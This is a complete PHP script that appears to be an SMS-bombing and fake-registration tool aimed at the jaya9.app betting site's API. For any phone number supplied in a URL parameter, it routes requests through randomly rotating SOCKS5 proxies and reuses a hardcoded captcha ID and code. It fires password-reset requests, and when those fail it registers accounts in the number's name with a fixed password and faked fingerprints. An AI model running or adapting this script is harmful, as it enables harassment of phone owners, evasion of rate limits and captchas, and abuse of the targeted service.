<?php
const API_URL = "https://www.jaya9.app/api";
const ORIGIN_URL = "https://www.jaya9.app";
const CAPTCHA_ID = "a7c7a5d2-1e2b-4a61-8fc5-dcdd5db3eee3";
const CAPTCHA_CODE = "4892";

function loadProxiesFromFile($filename) {
    $proxies = [];
    if (file_exists($filename)) {
        $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            list($ip, $port, $username, $password) = explode(':', $line);
            $proxies[] = "socks5://$username:$password@$ip:$port";
        }
    }
    return $proxies;
}

function getRandomProxy(&$proxies) {
    return $proxies[array_rand($proxies)];
}

function makeRequestWithProxy($url, $data = null, &$proxies, $isPost = false) {
    $proxy = getRandomProxy($proxies);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    if ($isPost && $data) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Content-Type: application/json",
            "Accept: application/json, text/plain, */*",
            "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
            "Origin: " . ORIGIN_URL,
            "Referer: " . ORIGIN_URL . "/"
        ]);
    }
    $response = curl_exec($ch);
    
    if (curl_errno($ch)) {
        curl_close($ch);
        return "Error: " . curl_error($ch);
    }

    curl_close($ch);

    return $response ?: "Error: No response received.";
}

function captchaRequest(&$proxies) {
    $url = API_URL . "/member/requestCaptchaCode?captcha_id=" . CAPTCHA_ID . "&captcha_code=" . CAPTCHA_CODE;
    return makeRequestWithProxy($url, null, $proxies);
}

function registerMember($phone, &$proxies) {
    $url = API_URL . "/member";
    $data = [
        "membercode" => generateRandomString(),
        "password" => "4Pw3yUrQKu2v",
        "currency" => "BDT",
        "email" => "",
        "registration_site" => "mobile",
        "mobile" => $phone,
        "line" => "",
        "referral_code" => "",
        "is_early_bird" => "0",
        "domain" => ORIGIN_URL,
        "language" => "en",
        "verification_code" => "",
        "reg_type" => 2,
        "agent_team" => "",
        "utm_source" => null,
        "utm_medium" => null,
        "utm_campaign" => null,
        "s2" => null,
        "fp" => generateRandomHex(),
        "pid" => null,
        "c_id" => null
    ];

    return makeRequestWithProxy($url, $data, $proxies, true);
}

function requestForgotPassword($mobile, $prefix, &$proxies) {
    $url = API_URL . "/member/reqFgtPsw";
    $data = [
        "mobile" => $mobile,
        "prefix" => $prefix,
        "captcha_id" => CAPTCHA_ID,
        "captcha_code" => CAPTCHA_CODE
    ];

    return makeRequestWithProxy($url, $data, $proxies, true);
}

function generateRandomString($length = 8) {
    return substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"), 0, $length);
}

function generateRandomHex($length = 32) {
    return bin2hex(random_bytes($length / 2));
}

function zeroUnading(string $phone): string {
    return ltrim($phone, '0');
}

$proxyList = loadProxiesFromFile('proxy.txt'); // Load proxies from file
$res = [];

header('Content-type: application/json; charset: utf-8');

if (empty($proxyList)) {
    $res['status'] = false;
    $res['msg'] = 'No valid proxies found.';
} elseif (isset($_GET['phone']) && !empty($_GET['phone'])) {
    $captchaResponse = captchaRequest($proxyList);
    if (strpos($captchaResponse, "Error:") === false) {
        $num = zeroUnading($_GET['phone']);
        $forgotPasswordResponse = requestForgotPassword($num, "+880", $proxyList);
        if (strpos($forgotPasswordResponse, "Error:") === false) {
            $res['result'] = json_decode($forgotPasswordResponse, true);
        } else {
            $res['msg'] = "Forgot password request failed: $forgotPasswordResponse";
            $registerResponse = registerMember($num, $proxyList);
            $res['registration_result'] = json_decode($registerResponse, true);
        }
    } else {
        $res['msg'] = 'Captcha request failed: ' . $captchaResponse;
    }
} else {
    $res['status'] = false;
    $res['msg'] = 'Input field empty!';
}

echo json_encode($res, JSON_PRETTY_PRINT);
?>